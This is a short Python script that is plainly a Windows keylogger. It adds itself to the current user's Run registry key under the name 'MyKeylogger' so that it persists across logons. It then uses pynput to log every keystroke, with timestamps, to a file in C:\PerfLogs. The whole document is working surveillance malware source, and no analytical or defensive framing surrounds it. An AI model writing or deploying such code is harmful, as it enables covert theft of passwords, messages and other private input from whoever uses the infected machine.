import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import sys
import winreg as reg

logDir = r"C:\PerfLogs"
script_path = os.path.realpath(sys.argv[0])

# Auto-start setup
def add_to_startup(name, path):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, name, 0, reg.REG_SZ, path)
    reg.CloseKey(reg_key)

add_to_startup("MyKeylogger", script_path)

# Keylogging
logging.basicConfig(filename=(logDir + r"/logsf.txt"),
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()